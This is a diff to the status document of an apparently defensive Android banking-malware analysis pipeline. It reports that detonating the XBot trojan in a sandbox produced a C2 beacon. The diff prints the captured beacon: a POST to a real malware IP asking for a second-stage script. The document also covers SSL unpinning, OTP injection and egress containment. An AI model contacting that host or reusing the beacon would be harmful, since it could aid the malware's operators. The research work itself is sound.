@@ -22,7 +22,7 @@ Seven layers, glued by a single evidence record:
 | **L0** Ingestion & triage | Hashing, manifest, icon pHash, certificate, **bank-impersonation check**, routing | ✅ works |
 | **L1** Static analysis | jadx decompile + YARA (source, per-class dex, APK scopes); Ghidra for native | ⚠️ 37% malware-category detection (was 8%); **18 rules still dead** (B29) |
 | **Spine** | Merged `artifacts/<sha256>/evidence.json`, stable evidence IDs | ✅ works (L0+L1 wired) |
-| **L2** Dynamic analysis | Emulator detonation, Frida hooks, mitmproxy | ✅ MVP-ready (re-verified 2026-08-24): sentinel30 AVD boots, DroidBot operates the real UI, Frida/mitmproxy/tcpdump capture, **isolation IS enforced+verified** (`orchestrator.py:873/877`). One gap: sample payload never *fires* (needs SUBMIT-handler RE) |
+| **L2** Dynamic analysis | Emulator detonation, Frida hooks, mitmproxy | ✅ **demonstrated 2026-08-26**: XBot (`org.merry.core`) beaconed its C2 on launch through the real pipeline — first non-zero behavioural capture (§10). sentinel30 AVD boots, DroidBot operates the real UI, Frida/mitmproxy/tcpdump capture, **isolation IS enforced+verified** (`orchestrator.py:873/877`), and mitm now **contains** unknown egress. Gaps: SBI-style payloads still need SUBMIT-handler RE; incoming-SMS hook missing (§10) |
 | **L3** ML classifier | Calibrated maliciousness prior, bounded ±10 | ⚠️ models exist (`lamda_lgbm`, `banking_lgbm`); **unified pipeline-extracted dataset** in progress (2026-08-24) to kill train/serve skew — see §9 |
 | **L4** GenAI reasoning | Verified deobfuscation + report generation | ✅ works — OpenRouter free tier, execution verifier, $0.00/call |
 | **L5** Hybrid scoring | Auditable additive score + smoking-gun gates | ⚠️ built; **gates refuse to arm** while weights are unsupported (T24) |
@@ -62,7 +62,7 @@ python3 -m venv env && ./env/bin/pip install -r requirements.txt && ./env/bin/pi
 | jadx + bundled JDK 17 | ✅ `tools/jadx`, `tools/jdk17` |
 | **Ghidra** | ❌ absent — native track degrades gracefully; only ~12% of samples have native libs |
 | Android SDK, emulator, adb, frida-server, `/dev/kvm` | ✅ all present |
-| **`sentinel` AVD** | ❌ core-dumped on boot (T14) — **replaced** by ✅ `sentinel30` (android-30, on `/mnt/SharedData/`), which boots and detonates (2026-08-24) |
+| **`sentinel` AVD** | ❌ core-dumped on boot (T14) — **replaced** by ✅ `sentinel30` (android-30 Google-APIs x86_64, QEMU/ranchu on `/dev/kvm`, data at `/mnt/SharedData/cybershield-data/avd/sentinel30.avd`). Boot fixed 2026-08-25 (dropped `-writable-system`); re-verified live 2026-08-26: boots ~15–20s, `adb root` + guest `iptables`/`nc`/ping work, isolation enforces+verifies. Detonates real malware (§10) |
 
 ---
 
@@ -377,9 +377,11 @@ separate member ruleset + per-class dex buffers + `L1/yara_templates/apk_bfsi_pr
    in resource tables, which is a documented anti-analysis technique.
 4. ~~**Rule-firing report (A4)**~~ — ✅ done, `tools/rule_firing_report.py`. Its result is
    T24/B30: 32 of 45 signals priced negative at `n_benign = 4`.
-5. **L2 emulator boot** (T14), then `dexray-intercept` + a BFSI hook pack (incoming SMS,
-   accessibility, notification listener). L2 has no spine producer yet. **Detonation of any
-   sample is user-approved**; a go/no-go checkpoint is owed after the India-12 stage.
+5. ~~**L2 emulator boot** (T14)~~ — ✅ fixed (sentinel30) and **demonstrated 2026-08-26**:
+   XBot beaconed its C2 through the real pipeline (§10). Still owed: a BFSI hook pack —
+   above all an **incoming-SMS** hook (the pack only hooks outgoing `sendTextMessage`, but
+   XBot-style theft is on incoming SMS); accessibility / notification-listener hooks. L2 has
+   no spine producer yet. **Detonation of any sample is user-approved.**
 6. **Stale malware `L0/artifacts/`** (pre-A6, T16) — largely superseded by the corpus run,
    but the pre-A6 files remain.
 7. ~~**No L3 model is trained.**~~ STALE — models exist (`L3/model/lamda_lgbm.joblib`,
@@ -454,7 +456,9 @@ install/grant/accessibility/honeypot → DroidBot + Frida re-attach-by-PID loop 
 - **Networking IS captured**: mitmproxy logs every request to `network_evidence.json`
   (keyword + base64 + volume exfil detection, plus active bank/UPI/Firebase/Telegram
   response hijacking); tcpdump → `capture.pcap`. HTTPS via `ssl_unpin.js` (no system CA —
-  /system read-only). FCM `mtalk.google.com:5228` is unproxiable → DNS-blackholed.
+  /system read-only). FCM `mtalk.google.com:5228` is unproxiable → DNS-blackholed. **As of
+  2026-08-26 the addon also *contains* unknown egress — every non-honeypot host is blocked,
+  not forwarded (§10).**
 - **OTP system**: OTPs pre-generated → `latest_injected_otp.txt` (`DROIDBOT_OTP_FILE`);
   injected as REAL incoming SMS via `adb emu sms send` at T+10/20/30 (sbi/hdfc/icici); a
   droidbot `device_state.py` patch types the actual arriving OTP into OTP fields.
@@ -481,3 +485,55 @@ represented. The `meaningful_tokens` filter (permissions/intents/hardware/URLs +
 security-sensitive API calls) drops androidx/kotlin library signatures so the model can't
 just learn "uses androidx → benign". Metrics flag AUROC ≥ 0.99 as leakage. Model stays a
 bounded ±10 generic prior, never a verdict.
+
+---
+
+## 10. Update 2026-08-26 — L2 demonstrated, mitm contains egress, L4 promotion plan
+
+### L2 caught real malicious behaviour for the first time (upgrades §1/§9 "MVP-ready")
+A live detonation of the **XBot** banking trojan
+(`corpus/malware_raw/android-malware/xbot/1264C25D…F61F23.apk`, package
+`org.merry.core`) through `L2/sandbox/orchestrator.py` produced the **first non-zero
+behavioural capture** from any L2 run. XBot beaconed its C2 **on launch** — no UI /
+SUBMIT-handler interaction needed, because it carries a `BOOT_COMPLETED` receiver (unlike
+the SBI sample, whose payload gates behind a form submit). Captured in
+`L2/sandbox/artifacts/org.merry.core/network_evidence.json`:
+
+```
+POST http://192.227.137.154/request.php   (form body)
+data=<base64>  ->  {"name":"bootScriptNet","action":"get_script"}
+```
+
+i.e. a dropper "fetch second-stage script" C2 command. Every prior L2 run was attach-only
+with `findings=0`. Full write-up: `docs/l2_droidbot_reliability_log.md` (2026-08-26 entry).
+
+### `mitm_addon.py` now CONTAINS web egress (was: observe-only)
+The addon used to *forward* any non-honeypot host's HTTP(S) to the real internet (a real
+egress leak — XBot's C2 POST would have gone out). Now **all decisions happen in
+`request()`**: known honeypot endpoints get their canned fake via the new
+`_honeypot_response()` helper (the old `response()` hook is gone — the fake is purely
+request-derived), and **every other host is BLOCKED by default** — answered locally with
+`200 {}`, tagged `blocked: true`, never forwarded. New override
+`SENTINEL_MITM_BLOCK_UNKNOWN=0` (and `__init__` param `block_unknown`) restores
+forward-and-observe. In the XBot run all 9 outbound requests (C2 POST + OS connectivity
+checks) were `blocked: true`; the C2 POST to the malware IP was blocked, not forwarded.
+
+### Remaining L2 gaps — do NOT overstate L2 as complete
+- **Containment vs observation tradeoff**: a blocked C2 sends no command back, so deeper
+  stages (SMS theft, overlay) don't fire; observing them means faking a plausible C2 reply.
+- **Incoming-SMS hook missing**: the Frida pack hooks outgoing `sendTextMessage`, not the
+  incoming path (broadcast receiver / `SmsMessage.createFromPdu`) XBot-style theft uses.
+- **Form-field base64 not auto-decoded**: `mitm_addon._decode_base64_payload` decodes only
+  raw-JSON bodies, so the `data=<base64>` **form-field** beacon was not auto-flagged.
+- **Two code bugs still stand**: `honeypot.seed_contacts()` binds no name/number;
+  `l2_engine.process()` globs all `L2/sandbox/artifacts/*` dirs.
+
+### L4 verified-decode promotion plan (proposed, awaiting review)
+`docs/plans/l4_verified_decode_promotion_plan.md` designs promoting L4's **structural**
+decodes (base64/base32/hex only — **not** the coincidence-prone speculative XOR/ROT13 tier)
+into spine findings → a new `l4:decoded_indicator` signal, so L4's mechanical verification
+finally reaches L5/L6. **Changes no score today**: the signal is unpriced and T24 still holds
+the policy `unsupported`; it only makes machine-verified evidence *reach the spine* (L6 can
+cite it, A4 can price it). Companion section feeds AndroidManifest components + resources.arsc
+app-strings into L4 reasoning as new checkable claim classes in `verify.py`. Preserves "LLM
+contributes zero points" — only machine-decoded facts promote, never LLM judgment.
